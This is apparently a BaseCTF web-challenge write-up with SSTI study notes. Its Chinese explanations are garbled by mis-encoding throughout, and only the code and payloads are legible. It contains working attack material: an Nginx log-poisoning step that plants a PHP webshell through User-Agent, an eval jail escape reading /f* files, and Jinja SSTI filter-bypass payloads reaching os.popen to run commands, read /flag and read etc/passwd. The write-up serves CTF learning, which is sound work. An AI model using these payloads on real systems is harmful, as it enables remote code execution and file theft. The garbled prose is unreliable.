```

ç¬¬ä¸€æ­¥è¦æ±‚æˆ‘ä»¬è¾“å…¥ä¸€ä¸ªé•¿åº¦å’Œ$arrayç›¸åŒçš„æ•°ç»„ï¼Œè¿™é‡Œä¸€ç‚¹ç‚¹è¯•æ¢ï¼Œè¯•å‡ºé•¿åº¦ä¸º45

```
len[]=0&len[]=1&len[]=2&len[]=3&len[]=4&len[]=5&len[]=6&len[]=7&len[]=8&len[]=9&len[]=10&len[]=11&len[]=12&len[]=13&len[]=14&len[]=15&len[]=16&len[]=17&len[]=18&len[]=19&len[]=20&len[]=21&len[]=22&len[]=23&len[]=24&len[]=25&len[]=26&len[]=27&len[]=28&len[]=29&len[]=30&len[]=31&len[]=32&len[]=33&len[]=34&len[]=35&len[]=36&len[]=37&len[]=38&len[]=39&len[]=40&len[]=41&len[]=42&len[]=43&len[]=44
```

ä¹‹åä¼ å…¥?tip=æˆ‘è¦ç©åŸç¥å®Œæˆç¬¬äºŒæ­¥

ä¼ å…¥m[]=0&m[]=1å®Œæˆç¬¬ä¸‰æ­¥
ç¬¬å››æ­¥éœ€è¦æˆ‘ä»¬å°†m[0]å’Œm[1]çš„å€¼åˆ†åˆ«ä¿®æ”¹ä¸º100%å’Œlove100%.md5($a)

å…¶ä¸­md5($a)åŠ å¯†å€¼ä¸º30BD7CE7DE206924302499F197C7A966

%ç”¨urlåŠ å¯†å¾—åˆ°

```
%25len[]=0&len[]=1&len[]=2&len[]=3&len[]=4&len[]=5&len[]=6&len[]=7&len[]=8&len[]=9&len[]=10&len[]=11&len[]=12&len[]=13&len[]=14&len[]=15&len[]=16&len[]=17&len[]=18&len[]=19&len[]=20&len[]=21&len[]=22&len[]=23&len[]=24&len[]=25&len[]=26&len[]=27&len[]=28&len[]=29&len[]=30&len[]=31&len[]=32&len[]=33&len[]=34&len[]=35&len[]=36&len[]=37&len[]=38&len[]=39&len[]=40&len[]=41&len[]=42&len[]=43&len[]=44&m[]=100%25&m[]=love100%2530bd7ce7de206924302499f197c7a966

```

è´´ä¸€ä¸‹ä¸Šä¼ å†…å®¹,å¾—åˆ°

```
["3295c76acbf4caaed33c36b1b5fc2cb1","26657d5ff9020d2abefe558796b99584","73278a4a86960eeb576a8fd4c9ec6997","ec8956637a99787bd197eacd77acce5e","e2c420d928d4bf8ce0ff2ec19b371514","43ec517d68b6edd3015b3edc9a11367b","ea5d2f1c4608232e07d3aa3d998e5135","c8ffe9a587b126f152ed3d89a146b445","03afdbd66e7929b125f8597834fa83a4","66f041e16a60928b05a7e228a89c3799","44f683a84163b3523afe57c2e008bc8c","03afdbd66e7929b125f8597834fa83a4","44f683a84163b3523afe57c2e008bc8c","9a1158154dfa42caddbd0694a4e9bdc8","c9e1074f5b3f9fc8ea15d152add07294","5f93f983524def3dca464469d2cf9f3e","7f39f8317fbdb1988ef4c628eba02591","d645920e395fedad7bbbed0eca3fe2e0","07e1cd7dca89a1678042477183b7ac3f","6364d3f0f495b6ab9dcf8d3b5c6e0b01","6364d3f0f495b6ab9dcf8d3b5c6e0b01","9f61408e3afb633e50cdf1b20de6f466","e369853df766fa44e1ed0ff613f563bd","c45147dee729311ef5b5c3003946c48f","d9d4f495e875a2e075a1a4a6e1b9770f","da4fb5c6e93e74d3df8527599fa62642","b53b3a3d6ab90ce0268229151c9bde11","e369853df766fa44e1ed0ff613f563bd","a1d0c6e83f027327d8461063f4ac58a6","a5bfc9e07964f8dddeb95fc584cd965d","d67d8ab4f4c10bf22aa353e27879133c","c0c7c76d30bd3dcaefc96f40275bdc0a","b6d767d2f8ed5d21a44b0e5886680cb9","14bfa6bb14875e45bba028a21ed38046","4e732ced3463d06de0ca9a15b6153677","1f0e3dad99908345f7439f8ffabdffc4","33e75ff09dd601bbe69f351039152189","e2c420d928d4bf8ce0ff2ec19b371514","70efdf2ec9b086079795c442636b55fb","1f0e3dad99908345f7439f8ffabdffc4","c16a5320fa475530d9583c34fd356ef5","32bb90e8976aab5298d5da10fe66f21d","6ea9ab1baa0efb9e19094440c317e21b","6f4922f45568161a8cdf4ad2299f6d23","43ec517d68b6edd3015b3edc9a11367b"]
```

```php
include 'flag.php';
  $flag[] = array();  //å°†flagä¸­çš„å…ƒç´ æ”¾è¿›ä¸€ä¸ªæ•°ç»„ä¸­å­˜å‚¨
  for ($ii = 0;$ii < sizeof($array);$ii++) {  //éå†æ¯ä¸€ä¸ªå…ƒç´  
    $flag[$ii] = md5(ord($array[$ii]) ^ $ii); //è·å–flagçš„å…ƒç´ çš„ç¼–ç å¹¶ä¸ç¼–å·è¿›è¡Œå¼‚æˆ–è¿ç®—
  }
  
  echo json_encode($flag);    //ä½¿ç”¨ json_encode å‡½æ•°å°† $flag æ•°ç»„è½¬æ¢ä¸º JSON æ ¼å¼
} 
```

æœ¬æ¥æ˜¯ä½¿ç”¨pyè„šæœ¬ï¼Œä½†æ˜¯å¥½åƒæ˜¯pyè„šæœ¬å’Œphpçš„åŠ å¯†æ–¹å¼ä¸ä¸€æ ·ï¼Œæ‰€ä»¥è¯•äº†è¯•

```
<?php

$md5 = [
    "3295c76acbf4caaed33c36b1b5fc2cb1", "26657d5ff9020d2abefe558796b99584",
    "73278a4a86960eeb576a8fd4c9ec6997", "ec8956637a99787bd197eacd77acce5e",
    "e2c420d928d4bf8ce0ff2ec19b371514", "43ec517d68b6edd3015b3edc9a11367b",
    "ea5d2f1c4608232e07d3aa3d998e5135", "c8ffe9a587b126f152ed3d89a146b445",
    "f457c545a9ded88f18ecee47145a72c0", "03afdbd66e7929b125f8597834fa83a4",
    "093f65e080a295f8076b1c5722a46aa2", "03afdbd66e7929b125f8597834fa83a4",
    "698d51a19d8a121ce581499d7b701668", "d82c8d1619ad8176d665453cfb2e55f0",
    "b53b3a3d6ab90ce0268229151c9bde11", "9f61408e3afb633e50cdf1b20de6f466",
    "7f39f8317fbdb1988ef4c628eba02591", "07e1cd7dca89a1678042477183b7ac3f",
    "a1d0c6e83f027327d8461063f4ac58a6", "7f6ffaa6bb0b408017b62254211691b5",
    "d67d8ab4f4c10bf22aa353e27879133c", "9f61408e3afb633e50cdf1b20de6f466",
    "e369853df766fa44e1ed0ff613f563bd", "5fd0b37cd7dbbb00f97ba6ce92bf5add",
    "67c6a1e7ce56d3d6fa748ab6d9af3fd7", "3416a75f4cea9109507cacd8e2f2aefc",
    "b53b3a3d6ab90ce0268229151c9bde11", "1c383cd30b7c298ab50293adfecb7b18",
    "3416a75f4cea9109507cacd8e2f2aefc", "da4fb5c6e93e74d3df8527599fa62642",
    "c8ffe9a587b126f152ed3d89a146b445", "c0c7c76d30bd3dcaefc96f40275bdc0a",
    "735b90b4568125ed6c3f678819b6e058", "14bfa6bb14875e45bba028a21ed38046",
    "fc490ca45c00b1249bbe3554a4fdf6fb", "37693cfc748049e45d87b8c7d8b9aacd",
    "37693cfc748049e45d87b8c7d8b9aacd", "98f13708210194c475687be6106a3b84",
    "3c59dc048e8850243be8079a5c74d079", "fc490ca45c00b1249bbe3554a4fdf6fb",
    "33e75ff09dd601bbe69f351039152189", "4e732ced3463d06de0ca9a15b6153677",
    "33e75ff09dd601bbe69f351039152189", "c16a5320fa475530d9583c34fd356ef5",
    "43ec517d68b6edd3015b3edc9a11367b"
];

// ç”¨äºå­˜å‚¨è¿˜åŸå‡ºçš„å­—ç¬¦
$flag = '';

for ($i = 0; $i < count($md5); $i++) {
    for ($j = 0; $j < 256; $j++) {
        // è®¡ç®—å¼‚æˆ–æ“ä½œåçš„å€¼
        $xor_result = $j ^ $i;
        // è®¡ç®—MD5å€¼
        $calculated_md5 = md5($xor_result);
        // å¦‚æœè®¡ç®—å‡ºçš„MD5å€¼ä¸ç»™å®šçš„MD5å€¼åŒ¹é…ï¼Œåˆ™æ‰¾åˆ°äº†æ­£ç¡®çš„å­—ç¬¦
        if ($calculated_md5 === $md5[$i]) {
            $flag .= chr($j);
            break;
        }
    }
}

echo "Flag: " . $flag . "\n";

?>

```

è¿è¡Œåå¾—åˆ°ç»“æœ

Flag: BaseCTF{9614c897-f8c3-4e70-85eb-cdc4313f4364}

#### æ»¤ä¸ªä¸åœ

##### Nginxæ—¥å¿—æ³¨å…¥

å‚è€ƒæ–‡çŒ®([ã€CTFã€‘Nginxæ—¥å¿—æ³¨å…¥_ctf nginx-CSDNåšå®¢](https://blog.csdn.net/star3119391396/article/details/142412092?ops_request_misc=&request_id=&biz_id=102&utm_term=CTFnginx&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-142412092.142^v100^pc_search_result_base4&spm=1018.2226.3001.4187))

æ—¥å¿—åŒ…å«æ¼æ´çš„æˆå› è¿˜æ˜¯æœåŠ¡å™¨æ²¡æœ‰è¿›è¡Œä¸¥æ ¼çš„è¿‡æ»¤ ï¼Œå¯¼è‡´ç”¨æˆ·å¯ä»¥è¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–ï¼Œä½†æ˜¯å‰ææ˜¯æœåŠ¡å™¨éœ€è¦å¼€å¯äº†è®°å½•æ—¥å¿—çš„åŠŸèƒ½æ‰å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´ã€‚

```
å¯¹äºApacheï¼Œæ—¥å¿—å­˜æ”¾è·¯å¾„ï¼š/var/log/apache/access.log

å¯¹äºNgnixï¼Œæ—¥å¿—å­˜æ”¾è·¯å¾„ï¼š/var/log/nginx/access.log å’Œ /var/log/nginx/error.log
```

```
/etc/nginx/nginx.confï¼šè¯¥æ–‡ä»¶æ˜¯Nginxçš„é…ç½®çš„æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶ä¿å­˜ç€èƒ½å¤Ÿå½±å“æœåŠ¡å™¨è¿è¡Œçš„é…ç½®ä¿¡æ¯ã€‚æœ‰æ—¶ä¼šæ³„éœ²æ•æ„Ÿä¿¡æ¯ã€‚è¯¥æ–‡ä»¶æ”¯æŒphpè§£æã€‚
/var/log/nginx/access.logï¼šè¯¥æ–‡ä»¶æ˜¯Nginxçš„è®¿é—®æ—¥å¿—æ–‡ä»¶ï¼ŒNginxä¼šæŠŠæ¯ä¸ªç”¨æˆ·è®¿é—®ä¿¡æ¯è®°å½•åˆ°æŒ‡å®šçš„æ—¥å¿—æ–‡ä»¶é‡Œã€‚è¯¥æ–‡ä»¶æ”¯æŒphpè§£æã€‚
```

ä¸€èˆ¬ç»“åˆä¸€å¥è¯æœ¨é©¬ä½¿ç”¨

å†™å…¥ä¸€å¥è¯æœ¨é©¬ä¹‹åï¼Œä½¿ç”¨èšå‰‘å°è¯•è¿æ¥

è¿æ¥urlå³ä¸ºæ—¥å¿—çš„åœ°å€ï¼š?url=/var/log/nginx/access.log

##### é¢˜ç›®åˆ†æ



```
 <?php
highlight_file(__FILE__);
error_reporting(0);

$incompetent = $_POST['incompetent'];
$Datch = $_POST['Datch'];

if ($incompetent !== 'HelloWorld') {
    die('å†™å‡ºç¨‹åºå‘˜çš„ç¬¬ä¸€è¡Œé—®å€™å§ï¼');
}

//è¿™æ˜¯ä¸ªä»€ä¹ˆä¸œä¸œï¼Ÿï¼Ÿï¼Ÿ
$required_chars = ['s', 'e', 'v', 'a', 'n', 'x', 'r', 'o'];
$is_valid = true;

foreach ($required_chars as $char) {
    if (strpos($Datch, $char) === false) {
        $is_valid = false;
        break;
    }
}

if ($is_valid) {

    $invalid_patterns = ['php://', 'http://', 'https://', 'ftp://', 'file://' , 'data://', 'gopher://'];

    foreach ($invalid_patterns as $pattern) {
        if (stripos($Datch, $pattern) !== false) {
            die('æ­¤è·¯ä¸é€šæ¢æ¡è·¯è¯•è¯•?');
        }
    }


    include($Datch);
} else {
    die('æ–‡ä»¶åä¸åˆè§„ è¯·é‡è¯•');
}
?>
æ–‡ä»¶åä¸åˆè§„ è¯·é‡è¯•
```

æ³¨æ„åˆ°Datchä¼šç›´æ¥è¿›è¡Œincludeå‡½æ•°æ‰§è¡Œï¼Œå‘ç°æ¼æ´ï¼Œéœ€è¦æˆ‘ä»¬æ‰§è¡Œ

ç¬¬ä¸€æ­¥åŸºç¡€ä¸å¤šè®²

ç¬¬äºŒéƒ¨è¦ç»•è¿‡å¯¹äºDatchçš„æ£€æµ‹

æŸ¥è¯¢åå‘ç°strpos()å‡½æ•°å¯ä»¥ç”¨æ•°ç»„è¿›è¡Œç»•è¿‡ï¼Œå³ç”¨Datch[]=å³å¯

ç¬¬ä¸‰æ­¥å¤§é‡çš„ä¼ªåè®®éƒ½banäº†ï¼Œä¸Šç½‘è¿›è¡Œæœç´¢ï¼Œå‘ç°æ˜¯Nginxæ—¥å¿—æ³¨å…¥

ä»burpçœ‹è§server

```
Server: nginx/1.18.0
```

æ‹¥æœ‰nginxå…³é”®è¯

è¾“å…¥/var/log/nginx/access.logå°è¯•æ³¨å…¥ï¼Œburpæ˜¾ç¤ºèƒ½å¤Ÿè¿›è¡Œ

![](https://s2.loli.net/2024/11/17/IU5Ypt2QOL1ZvBf.png)

å·¦ä¾§å‡ºç°äº†ç›¸å…³æ—¥å¿—

å‘ç°æ˜¯User-Agentä¸­çš„å†…å®¹ï¼Œå› æ­¤æˆ‘ä»¬åœ¨å…¶ä¸­æ’å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œç›´æ¥æ‰§è¡Œå³å¯è·å¾—flag

![](https://s2.loli.net/2024/11/17/ncl3v7MhTP4gj8O.png)

#### ez_php_jail

##### å‰ç½®çŸ¥è¯†ç‚¹

```
å½“ php ç‰ˆæœ¬â¼©äº 8 æ—¶ï¼ŒGET è¯·æ±‚çš„å‚æ•°åå«æœ‰ . ï¼Œä¼šè¢«è½¬ä¸º _ ï¼Œä½†æ˜¯å¦‚æœå‚æ•°åä¸­æœ‰ [ ï¼Œè¿™

ä¸ª [ ä¼šè¢«ç›´æ¥è½¬ä¸º _ ï¼Œä½†æ˜¯åâ¾¯å¦‚æœæœ‰ . ï¼Œè¿™ä¸ª . å°±ä¸ä¼šè¢«è½¬ä¸º _ ã€‚
æ‰€ä»¥æ­£ç¡®å½¢å¼åº”è¯¥æ˜¯?Jail[by.Happy=
```

```
highlight_fileé…åˆglob, glob é€šå¸¸ç”¨äºåŒ¹é…ç¬¦åˆç‰¹å®šè§„åˆ™çš„æ–‡ä»¶è·¯å¾„å, glob("/f*") ä¼šæœç´¢æ–‡ä»¶ç³»ç»Ÿä¸­æ‰€æœ‰ä»¥ /f å¼€å¤´çš„æ–‡ä»¶æˆ–ç›®å½•ã€‚ç„¶åï¼Œé€šè¿‡ [0] ç´¢å¼•é€‰æ‹©ç¬¬ä¸€ä¸ªåŒ¹é…çš„ç»“æœ
```

```php
<?php
// æ˜¾ç¤ºå½“å‰æ–‡ä»¶çš„æºä»£ç 
highlight_file(__FILE__);

// å…³é—­é”™è¯¯æŠ¥å‘Šï¼Œé˜²æ­¢è¾“å‡ºé”™è¯¯ä¿¡æ¯
error_reporting(0);

// åŒ…å«ä¸€ä¸ªåä¸º hint.html çš„æ–‡ä»¶
include("hint.html");

// è·å–GETè¯·æ±‚ä¸­çš„'Jail_by.Happy'å‚æ•°
$Jail = $_GET['Jail_by.Happy'];

// æ£€æŸ¥'Jail_by.Happy'å‚æ•°æ˜¯å¦å­˜åœ¨
if ($Jail == null) {
    // å¦‚æœä¸å­˜åœ¨ï¼Œç»ˆæ­¢è„šæœ¬å¹¶è¾“å‡ºæç¤ºä¿¡æ¯
    die("Do You Like My Jail?");
}

// å®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºæ£€æŸ¥è¾“å…¥æ˜¯å¦åŒ…å«æŸäº›ç‰¹å®šå­—ç¬¦æˆ–å…³é”®å­—
function Like_Jail($var) {
    // ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æ£€æŸ¥è¾“å…¥æ˜¯å¦åŒ…å«ç‰¹å®šå­—ç¬¦æˆ–å…³é”®å­—
    if (preg_match('/(`|\$|a|c|s|require|include)/i', $var)) {
        // å¦‚æœåŒ…å«ï¼Œè¿”å›false
        return false;
    }
    // å¦‚æœä¸åŒ…å«ï¼Œè¿”å›true
    return true;
}

// è°ƒç”¨Like_Jailå‡½æ•°æ£€æŸ¥$Jailå‚æ•°
if (Like_Jail($Jail)) {
    // å¦‚æœæ£€æŸ¥é€šè¿‡ï¼Œä½¿ç”¨evalæ‰§è¡Œ$Jailä¸­çš„ä»£ç 
    eval($Jail);
    // è¾“å‡ºæç¤ºä¿¡æ¯
    echo "Yes! you escaped from the jail! LOL!";
} else {
    // å¦‚æœæ£€æŸ¥æœªé€šè¿‡ï¼Œè¾“å‡ºæç¤ºä¿¡æ¯
    echo "You will Jail in your life!";
}

// è¾“å‡ºæ¢è¡Œç¬¦
echo "\n";

// åœ¨HTMLè§£æåå†è¾“å‡ºPHPæºä»£ç 
highlight_file(__FILE__);

?>
```

é¦–å…ˆæŸ¥çœ‹ï¼Œéœ€è¦æˆ‘ä»¬ä¼ å‚ï¼Œæ ¹æ®å‰é¢çš„çŸ¥è¯†ï¼Œå®é™…ä¸Šåº”è¯¥ä¸º?Jail[by.Happy=

ä¹‹åä½¿ç”¨highlight_fileå’Œglobå‡½æ•°æ¥è”åˆæŸ¥è¯¢

```
highlight_fileé…åˆglob, glob é€šå¸¸ç”¨äºåŒ¹é…ç¬¦åˆç‰¹å®šè§„åˆ™çš„æ–‡ä»¶è·¯å¾„å, glob("/f*") ä¼šæœç´¢æ–‡ä»¶ç³»ç»Ÿä¸­æ‰€æœ‰ä»¥ /f å¼€å¤´çš„æ–‡ä»¶æˆ–ç›®å½•ã€‚ç„¶åï¼Œé€šè¿‡ [0] ç´¢å¼•é€‰æ‹©ç¬¬ä¸€ä¸ªåŒ¹é…çš„ç»“æœ
```

```Plain
?Jail[by.Happy=highlight_file(glob("/f*")[0]);
```

ï¼ˆè¿™é‡Œåº”è¯¥ä¸»è¦è€ƒå¯Ÿçš„è¿˜æ˜¯ä¸€ç§æ–°çš„æ–‡ä»¶æ£€ç´¢æ–¹æ³•å§ï¼‰

![](https://s2.loli.net/2024/11/17/YGIhizspKe42cTA.png)

#### å¤è¯»æœº

é¦–å…ˆé€šè¿‡ç²—è¡¨å¤§è‡´è¯•å‡ºå±è”½è¯

å‘ç°å±è”½äº†

```
+ - * / . {{ }} __ : " \ å’Œclassç­‰å…³é”®è¯

å…³é”®è¯é€šè¿‡cl''assç»•è¿‡

{{}}ä½¿ç”¨{%print%}ç»•è¿‡

__å±è”½é€‰æ‹©  _''_ç»•è¿‡

.ä½¿ç”¨[]ç»•è¿‡
{{().__class__}} å¯æ›¿æ¢ä¸º:{{()["__class__"]}}

```

ç„¶åå°†ç»å…¸å¥å¼æ›¿æ¢(å½“ç„¶ï¼Œå…·ä½“ä½ç½®å’Œå‘½ä»¤éƒ½å¯ä»¥ä¿®æ”¹)

```
{%print(c.__class__.__mro__[3].__subclasses__()[137].__init__.__globals__['popen']('whoami').read())%}è¿›è¡Œæ›¿æ¢
```

ä½†æ˜¯è¿™é‡Œä¸çŸ¥åˆ°ä¸ºä»€ä¹ˆ

```
__mro__å¤±æ•ˆäº†ï¼Œäºæ˜¯è¿ç”¨åŸºç¡€çš„__base__
```

ç”¨ä¸€æ¬¡baseæ‰¾åˆ°äº†objï¼Œç„¶åä»objç”¨__subclasses__()è¿›å…¥ç»å…¸å˜é‡popenæ‰€åœ¨åœ°<class 'os._wrap_close'>

![](https://s2.loli.net/2024/11/17/HaWXK5RjcteZf7w.png)

ä¹‹åæŒ‰ç…§ç»å…¸å¥—è·¯è¿›å…¥popenæ‰§è¡Œå‘½ä»¤å³å¯

ç”¨initåˆå§‹åŒ–ï¼Œç”¨globalè¿›å…¥å…¨å±€å˜é‡ï¼Œé€‰æ‹©popenï¼Œæ‰§è¡Œpwnå‘½ä»¤å¹¶åŠ ä¸Šreadè¯»å‡ºæŒ‡ä»¤è®©printæ‰“å°å‡ºæ¥

```
BaseCTF{%print(''['_''_cl''ass_''_']['_''_ba''se_''_']['_''_subcla''sses_''_']()[137]['_''_in''it_''_']['_''_glo''bals_''_']['po''pen']('pwd')['rea''d']())%}
```

ç„¶åè€ƒè™‘åˆ°/è¢«banï¼Œä½¿ç”¨chrç»•è¿‡å³å¯

```
BaseCTF{% set cmd='cat '~'%c'%(47)~'flag' %} {%print(''['_''_cl''ass_''_']['_''_ba''se_''_']['_''_subcla''sses_''_']()[137]['_''_in''it_''_']['_''_glo''bals_''_']['po''pen'](cmd)['rea''d']())%}
```

è€Œä¸ºäº†ä¿®æ”¹æ–¹ä¾¿ï¼Œpopenä¸­çš„å‘½ä»¤ä½¿ç”¨cmdå˜é‡å³å¯

![](https://s2.loli.net/2024/11/17/vaTI4uZXSn6RDwh.png)


## SSIT

å‚è€ƒæ–‡çŒ®ï¼š [1. SSTIï¼ˆæ¨¡æ¿æ³¨å…¥ï¼‰æ¼æ´ï¼ˆå…¥é—¨ç¯‡ï¼‰ - bmjoker - åšå®¢å›­ (cnblogs.com)](https://www.cnblogs.com/bmjoker/p/13508538.html)

â€‹                    [2.SSTIæ¨¡æ¿æ³¨å…¥æ€»ç»“-CSDNåšå®¢](https://blog.csdn.net/Manuffer/article/details/120739989?ops_request_misc=&request_id=&biz_id=102&utm_term=SSTI&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-120739989.142^v100^pc_search_result_base4&spm=1018.2226.3001.4187)

â€‹                    3.[SSTIæ¼æ´è¯¦è§£-CSDNåšå®¢](https://blog.csdn.net/apple_74953689/article/details/140721321?ops_request_misc=%7B%22request%5Fid%22%3A%223145705D-6786-467D-98D5-EB37BF3A7091%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=3145705D-6786-467D-98D5-EB37BF3A7091&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-140721321-null-null.142^v100^pc_search_result_base4&utm_term=SSTI&spm=1018.2226.3001.4187)

â€‹		    4.[è¶…è¯¦ç»†SSTIæ¨¡æ¿æ³¨å…¥æ¼æ´åŸç†è®²è§£_sstiæ³¨å…¥-CSDNåšå®¢](https://blog.csdn.net/qq_61955196/article/details/132237648?ops_request_misc=%7B%22request%5Fid%22%3A%223145705D-6786-467D-98D5-EB37BF3A7091%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=3145705D-6786-467D-98D5-EB37BF3A7091&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-132237648-null-null.142^v100^pc_search_result_base4&utm_term=SSTI&spm=1018.2226.3001.4187)

SSTIæ¼æ´åˆ©ç”¨åŸºæœ¬æµç¨‹

è·å–å½“å‰ç±» -> è·å–å…¶objectåŸºç±» -> è·å–æ‰€æœ‰å­ç±» -> è·å–å¯æ‰§è¡Œshellå‘½ä»¤çš„å­ç±» -> è·å–å¯æ‰§è¡Œshellå‘½ä»¤çš„æ–¹æ³• -> æ‰§è¡Œshellå‘½ä»¤

### æ¦‚å¿µè¯¦è§£

#### ç»§æ‰¿ï¼ˆå¯»æ‰¾èƒ½å¤Ÿrceçš„å­ç±»ï¼‰

å…ˆæ‰¾åˆ°objï¼Œå†ä»objæ‰¾rce

##### æ‰¾object

```php
	class A:pass
	class B(A):pass
	class C(B):pass
	class D(c):pass
//å¯ä»¥çœ‹åˆ°æˆ‘ä»¬åˆ›å»ºäº†4ä¸ªç±»ï¼Œå…¶ä¸­çš„Bç±»ç»§æ‰¿äº†Aç±»ï¼ŒCã€Dç±»ç»§æ‰¿äº†Bç±»,å¦‚æœæˆ‘ä»¬åœ¨è¿™åˆ›å»ºä¸€ä¸ªCçš„å¯¹è±¡cï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡__class__é­”æœ¯æ–¹æ³•æ¥æ‰¾åˆ°å®ƒçš„å½“å‰ç±»
	c = C()
	print(c.__class)  //è¿™ä¸ªå‡½æ•°æ‰§è¡Œå°†ä¼šè¾“å‡ºå½“å‰ç±»C
	print(c.__class__.__base__)//è¿™ä¸ªå‡½æ•°å°†ä¼šæ‰¾åˆ°Cçš„çˆ¶ç±»Bï¼Œä»¥æ­¤ç±»æ¨ï¼Œå†åŠ ä¸€ä¸ª__base__å¯ä»¥æ‰¾Bçš„çˆ¶ç±»
    //ä»ä»£ç ä¸Šçœ‹å†ä¹‹åAç±»ä¸Šé¢åº”è¯¥æ˜¯æ²¡æœ‰ç±»äº†ï¼Œä½†æ˜¯å…¶å®æ‰€æœ‰çš„ç±»éƒ½æ—¶objectç±»çš„å­ç±»ï¼Œå½“æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªç±»è€Œæ²¡æœ‰æ˜¾å¼åœ°æŒ‡å®šå®ƒç»§æ‰¿çš„çˆ¶ç±»æ—¶ï¼Œè¿™ä¸ªç±»å°±ä¼šé»˜è®¤ç»§æ‰¿objectç±»ï¼Œ
    print(c.__class__.__base__.__base__.__base__)//æ­¤æ—¶ä¸ºc->C->B->A(Aæ— æŒ‡å®šç»§æ‰¿çˆ¶ç±»ï¼‰->object
    //å½“ç„¶è¿™æ ·è‡ªç„¶å¾ˆéº»çƒ¦ï¼Œäºæ˜¯å‡ºç°äº†ä¸€ä¸ªä¸€æ­¥åˆ°ä½çš„ä¸œè¥¿
    print(c.__class__.__mro__[3])
    //è¿™æ ·å°±ä¼šä»¥æ•°ç»„å½¢å¼è¾“å‡ºæ‰€æœ‰çš„çˆ¶ç±»å½“åŠ ä¸Š[3]æ—¶ä»£è¡¨è¾“å‡ºç¬¬ä¸‰çº§çˆ¶ç±»ï¼Œå³object  
```

##### ä»objæ‰¾rceç±»

```php
__subclasses__#å¯ä»¥ç”¨è¿™ä¸ªæ¥è·å–æ‰€æœ‰å­ç±»ï¼ŒåŒæ ·ç”¨æ•°ç»„å½¢å¼ç»™å‡º
#ä¸€èˆ¬rceæ™®éå¯»æ‰¾çš„éƒ½æ˜¯<class 'os._wrap_close'>ç±»ï¼Œä½ç½®ä¸€èˆ¬åœ¨139ä¸ªå·¦å³ï¼Œå¤§è‡´å»æ‰¾æ‰¾ï¼Œä¸ä¼šå·®è·å¤ªè¿œ
print(c.__class__.__mro__[3].__subclasses__()[138])
//ä¹‹åå°±æ˜¯å‘½ä»¤çš„åˆå§‹åŒ–å’Œè¿›å…¥å‘½ä»¤æ‰§è¡Œå˜é‡ï¼Œè¿™é‡Œæˆ‘ä»¬ä¸€èˆ¬é€‰æ‹©popen
__init__//åˆå§‹åŒ–
__globals__//è¿”å›å…¨å±€å˜é‡
__globals__['popen']//ä»å…¨å±€å˜é‡ä¸­é€‰å‡ºpopen
__globals__['popen']('whoami').read()//åœ¨popenä¸­æ‰§è¡Œwhoamiå‘½ä»¤ï¼Œä½†æ˜¯æ‰§è¡Œå‘½ä»¤â‰ æœ‰è¾“å‡ºï¼Œå› æ­¤è¿˜è¦åŠ ä¸Š.read()æ¥è¯»å–è¾“å‡º
//æœ€ç»ˆå˜æˆ
print(c.__class__.__mro__[3].__subclasses__()[138].__init__.__globals__['popen']('whoami').read())
```



åŒæ—¶ï¼Œä¹Ÿå¯ä»¥å°†å‘½ä»¤ä¿®æ”¹æˆå˜é‡ï¼Œä¾¿äºä¿®æ”¹

```
{{set cmd=***}}{{print(c.__class__.__mro__[3].__subclasses__()[138].__init__.__globals__['popen']('cmd').read())}}
```



### å‡½æ•°æ‰§è¡Œä¸ç»•è¿‡

#### æ¨¡ç³Šæµ‹è¯•ï¼šå¯ä»¥é€šè¿‡burpä¹‹ç±»æ¥æµ‹ä¸€æµ‹å…³é”®è¯å±è”½

æ­¤å¤„å¦‚æœä¸å‡ºç°ç›¸å…³ç­”æ¡ˆï¼Œåªä¼šæ˜¯é”™è¯¯æŒ¥ç€banäº†

```
class
bases
mro
subclasses
getitem
init
globals
builtins
import
url_for
lipsum
config
popen
request
''
""
[]
()
.
+
_
 
0
1
2
3
4
5
6
7
8
9
$
%

```



#### æ— è¿‡æ»¤æƒ…å†µ

1ã€ç›´æ¥ä½¿ç”¨systemã€catç­‰å‘½ä»¤è¿›è¡Œè¿œç¨‹ä»£ç æ‰§è¡Œ

```
\#**ç®€å•æŸ¥æ‰¾å…·ä½“pythonç±»çš„ç´¢å¼•ï¼š**
import os
print(''.__class__.__bases__[0].__subclasses__().index(os._wrap_close))


\#è¯»å–config
å¦‚æœflagå†™å…¥configå†…ï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥{{config}}æŸ¥çœ‹æˆ–è€…{{self.dict._TemplateReference__context.config}}

\#è¯»å–æ–‡ä»¶ç±»ï¼Œ<type â€˜fileâ€™> fileä½ç½®ä¸€èˆ¬ä¸º40ï¼Œç›´æ¥è°ƒç”¨
{{[].__class__.__base__.__subclasses__()[40]('flag').read()}} 
{{[].__class__.__bases__[0].__subclasses__()[40]('etc/passwd').read()}}
{{[].__class__.__bases__[0].__subclasses__()[40]('etc/passwd').readlines()}}
{{[].__class__.__base__.__subclasses__()[257]('flag').read()}} (python3)

\#ç›´æ¥ä½¿ç”¨popenå‘½ä»¤ï¼Œpython2æ˜¯éæ³•çš„ï¼Œåªé™äºpython3
ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼
**os._wrap_close** ç±»é‡Œæœ‰popenå’Œbuiltins,ä¸€èˆ¬ä½ç½®ä¸º132~139é™„è¿‘
<class â€˜site._Printerâ€™> è°ƒç”¨osçš„popenæ‰§è¡Œå‘½ä»¤
<class â€˜warnings.catch_warningsâ€™>ä¸€èˆ¬ä½ç½®ä¸º59ï¼Œå¯ä»¥ç”¨å®ƒæ¥è°ƒç”¨fileã€osã€evalã€commandsç­‰


{{"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('whoami').read()}}
{{"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__.popen('whoami').read()}}


